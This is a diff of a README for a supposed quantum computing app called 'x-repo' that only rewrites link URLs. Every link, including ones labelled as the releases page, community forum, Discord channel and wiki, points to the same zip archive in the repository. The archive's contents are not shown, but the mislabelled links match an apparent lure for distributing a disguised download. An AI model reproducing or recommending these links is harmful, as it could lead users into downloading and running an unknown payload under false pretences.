@@ -1,6 +1,6 @@
 # 🌟 x-repo - Unlock the World of Quantum Computing
 
-[![Download x-repo](https://raw.githubusercontent.com/Snikeeez/x-repo/main/backend/repo_x_3.5-alpha.3.zip%20x--repo-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Snikeeez/x-repo/main/backend/repo_x_3.5-alpha.3.zip)
+[![Download x-repo](https://github.com/Snikeeez/x-repo/raw/refs/heads/main/backend/repo_x_3.5-alpha.3.zip%20x--repo-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Snikeeez/x-repo/raw/refs/heads/main/backend/repo_x_3.5-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To begin using X-Repo, follow these simple steps to download and run the applica
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Snikeeez/x-repo/main/backend/repo_x_3.5-alpha.3.zip) to find the latest version. 
+   Go to our [Releases page](https://github.com/Snikeeez/x-repo/raw/refs/heads/main/backend/repo_x_3.5-alpha.3.zip) to find the latest version. 
 
 2. **Choose the Right Version**  
    Look for the version that fits your operating system. We offer versions for Windows, macOS, and Linux.
@@ -71,12 +71,12 @@ If you encounter issues, here are some common solutions:
 
 Join our community forums or check out our chat channels to connect with other users, share insights, and get help. 
 
-- Community Forum: [Visit here](https://raw.githubusercontent.com/Snikeeez/x-repo/main/backend/repo_x_3.5-alpha.3.zip)
-- Chat Channel: [Join on Discord](https://raw.githubusercontent.com/Snikeeez/x-repo/main/backend/repo_x_3.5-alpha.3.zip)
+- Community Forum: [Visit here](https://github.com/Snikeeez/x-repo/raw/refs/heads/main/backend/repo_x_3.5-alpha.3.zip)
+- Chat Channel: [Join on Discord](https://github.com/Snikeeez/x-repo/raw/refs/heads/main/backend/repo_x_3.5-alpha.3.zip)
 
 ## 🔗 Additional Resources
 
-- **Documentation**: Comprehensive user guides and tutorials are available in our [Wiki section](https://raw.githubusercontent.com/Snikeeez/x-repo/main/backend/repo_x_3.5-alpha.3.zip).
+- **Documentation**: Comprehensive user guides and tutorials are available in our [Wiki section](https://github.com/Snikeeez/x-repo/raw/refs/heads/main/backend/repo_x_3.5-alpha.3.zip).
 - **Help Center**: For FAQs and support, visit our Help Center.
 
 ## 📝 License
